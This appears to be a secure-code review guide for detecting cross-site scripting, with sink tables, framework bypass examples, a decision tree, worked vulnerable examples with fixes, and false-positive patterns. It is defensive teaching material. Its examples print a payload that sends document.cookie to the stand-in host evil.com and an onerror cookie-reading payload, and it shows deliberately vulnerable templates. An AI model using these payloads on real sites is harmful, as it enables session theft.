# Cross-Site Scripting (XSS) Detection

## Methodology

### Step 1: Identify All User Input Entry Points

Map every location where user-controlled data enters the application: query parameters,
POST body fields, URL path segments, HTTP headers (Referer, User-Agent), cookies,
WebSocket messages, file uploads (filenames, metadata), and database-stored user values.

```python
@app.route("/search")
def search():
    query = request.args.get("q", "")   # SOURCE
    return render_template("results.html", query=query)
```

```javascript
app.get("/user/:name", (req, res) => {
    res.send(`<h1>Hello ${req.params.name}</h1>`);  // SINK — reflected XSS
});
```

### Step 2: Trace Data Flow from Source to Sink

Follow user input through transformations, function calls, and storage until it reaches
an output sink. Track across module boundaries and database round-trips (stored XSS).

| Context        | Server-Side Sinks                        | Client-Side Sinks                         |
|----------------|------------------------------------------|-------------------------------------------|
| HTML body      | Jinja2 `|safe`, ERB `raw`, JSP `<%= %>`  | `innerHTML`, `outerHTML`, `document.write` |
| HTML attribute | Unquoted attribute injection              | `element.setAttribute("on*", ...)`        |
| JavaScript     | Inline `<script>` with interpolation      | `eval()`, `setTimeout(str)`, `Function()` |
| URL            | `href`/`src` with `javascript:` scheme    | `location.href = userInput`               |
| CSS            | `style` attribute injection               | `element.style.cssText = userInput`       |

### Step 3: Evaluate Output Encoding and Context

Verify the correct encoding for each rendering context. HTML-entity encoding is
insufficient inside `<script>` blocks; URL encoding is insufficient in HTML attributes.

```python
{{ user_input | safe }}    # VULNERABLE — Jinja2 bypass
{{ user_input }}           # SAFE — auto-escaping active
```

```java
<p><%= request.getParameter("name") %></p>   // VULNERABLE — JSP unescaped
<p><c:out value="${param.name}" /></p>        // SAFE — JSTL encoding
```

### Step 4: Analyze Framework Auto-Escaping Bypasses

Modern frameworks auto-escape by default. Audit the explicit bypass mechanisms:

```jsx
<div>{userInput}</div>                                          // React SAFE
<div dangerouslySetInnerHTML={{ __html: userInput }} />         // React VULNERABLE
```

```html
<span>{{ userInput }}</span>      <!-- Vue SAFE -->
<span v-html="userInput"></span>  <!-- Vue VULNERABLE -->
```

```html
<div>{{ userInput }}</div>        <!-- Angular SAFE (sanitized) -->
<div [innerHTML]="userInput"></div>
<!-- Angular: sanitized by default, but bypassSecurityTrustHtml() disables it -->
```

### Step 5: Inspect DOM-Based XSS Vectors

Client-side JS reading from DOM sources and writing to DOM sinks. Invisible in HTTP traffic.

```javascript
document.getElementById("output").innerHTML = location.hash.substring(1); // VULNERABLE
$("#display").html($.urlParam("msg"));                                    // VULNERABLE
document.write("<img src='" + location.search + "'>");                    // VULNERABLE
```

DOM sources: `location.hash`, `location.search`, `location.href`, `document.referrer`,
`document.cookie`, `window.name`, `postMessage` data, `localStorage`/`sessionStorage`.

### Step 6: Check Context-Specific Escaping Gaps

Mismatched encoding for the context causes bypasses even when encoding is present:

```html
<!-- VULNERABLE — HTML-encoded value in JS context (entities not interpreted in <script>) -->
<script>var name = "{{ user_input | e }}";</script>
<!-- SAFE — proper JS escaping -->
<script>var name = {{ user_input | tojson }};</script>

<!-- VULNERABLE — URL context, no scheme validation (javascript: passes HTML encoding) -->
<a href="{{ user_url }}">Click</a>
<!-- SAFE — scheme whitelist -->
{% if user_url.startswith(('http://', 'https://')) %}
<a href="{{ user_url }}">Click</a>
{% endif %}
```

### Step 7: Review CSP as Defense-in-Depth

Check if Content-Security-Policy blocks inline script execution. Strict nonce-based CSP
mitigates many XSS vectors but is NOT a substitute for output encoding. Note any
`unsafe-inline` or `unsafe-eval` directives that weaken CSP.

## Decision Tree

```
User input reaches output sink?
|
+-- NO --> SAFE
+-- YES
    |
    +-- HTML body
    |   +-- Auto-escaping active, no |safe / raw bypass? --> SAFE
    |   +-- Auto-escaping disabled or bypassed? --> VULNERABLE (High)
    +-- HTML attribute
    |   +-- Quoted AND HTML-encoded? --> SAFE
    |   +-- Unquoted OR event handler attribute? --> VULNERABLE (Critical)
    +-- JavaScript context
    |   +-- JSON-serialized (tojson / JSON.stringify)? --> SAFE
    |   +-- String interpolation with HTML encoding only? --> VULNERABLE (Critical)
    +-- URL context (href / src)
    |   +-- Scheme whitelist enforced (http/https only)? --> SAFE
    |   +-- No scheme validation? --> VULNERABLE (High)
    +-- DOM sink (innerHTML, document.write, eval)
    |   +-- Sanitized with DOMPurify or equivalent? --> HARDENED (Medium)
    |   +-- No sanitization? --> VULNERABLE (Critical)
    +-- Framework bypass (dangerouslySetInnerHTML, v-html, bypassSecurityTrust*)
        +-- Input from trusted server-side source only? --> HARDENED (Low)
        +-- Input contains user-controlled data? --> VULNERABLE (Critical)
```

## Real-World Examples

### Example 1: Stored XSS in Comment System (Python/Jinja2)

```python
@app.route("/comment", methods=["POST"])
def post_comment():
    body = request.form["body"]
    db.execute("INSERT INTO comments (body) VALUES (?)", (body,))
    return redirect("/posts/" + request.form["post_id"])
```
```html
{% for comment in comments %}
  <div class="comment">{{ comment.body | safe }}</div>
{% endfor %}
```

**Why vulnerable:** `| safe` disables Jinja2 auto-escaping. Attacker stores
`<script>document.location='https://evil.com/?c='+document.cookie</script>` as a comment.

**Impact:** Session hijacking for all users who view the page. Admin compromise if admin
views the comment. Classification: VULNERABLE (Critical).

**Fix:** Remove `| safe`. For rich text, sanitize server-side with bleach and a strict
tag allow-list.

### Example 2: Reflected XSS via Error Message (Node.js/EJS)

```javascript
app.get("/login", (req, res) => res.render("login", { error: req.query.error }));
```
```html
<% if (error) { %>
  <div class="alert"><%- error %></div>  <!-- <%- is UNESCAPED -->
<% } %>
```

**Why vulnerable:** EJS `<%-` outputs unescaped HTML. Attacker crafts
`/login?error=<img src=x onerror=alert(document.cookie)>` and distributes via phishing.

**Impact:** One-click session hijacking for any user who clicks the link. Classification:
VULNERABLE (High).

**Fix:** Use `<%= error %>` (HTML-encoded output) instead of `<%- error %>`.

### Example 3: DOM-Based XSS via jQuery

```javascript
$(document).ready(function() {
    const page = new URLSearchParams(window.location.search).get("page");
    if (page) { $("#breadcrumb").html("<span>Current: " + page + "</span>"); }
});
```

**Why vulnerable:** User-controlled query param `page` flows directly into jQuery `.html()`
which parses and renders HTML. Entirely client-side; invisible in server logs.

**Impact:** Cookie theft, keylogging, arbitrary DOM manipulation. Classification:
VULNERABLE (Critical).

**Fix:** Use `.text()` instead of `.html()`, or sanitize with DOMPurify before insertion.

## Common False Positive Patterns

1. **Static string in innerHTML.** `el.innerHTML = "<p>Loading...</p>"` with no user data
   is safe. Verify the string literal contains no dynamic segments.

2. **React JSX interpolation.** `<div>{userInput}</div>` auto-escapes. Only flag
   `dangerouslySetInnerHTML` or refs manipulating DOM directly.

3. **Angular template interpolation.** `{{ userInput }}` is auto-escaped. Only flag
   `[innerHTML]` combined with `bypassSecurityTrustHtml()`.

4. **Auto-escaping server frameworks.** Jinja2 (without `|safe`), Django templates
   (without `|safe`), Rails ERB `<%= %>` (without `raw`) all auto-escape by default.

5. **URL output with scheme validation.** If code validates URL starts with `http://` or
   `https://` before placing it in `href`, the `javascript:` vector is blocked.

6. **Sanitized HTML output.** DOMPurify, bleach, or sanitize-html with restrictive
   allow-lists are effective. Only flag if dangerous tags/attributes are allowed.

7. **Content-Type: application/json.** API endpoints returning JSON are not vulnerable to
   reflected XSS because browsers do not render JSON as HTML.
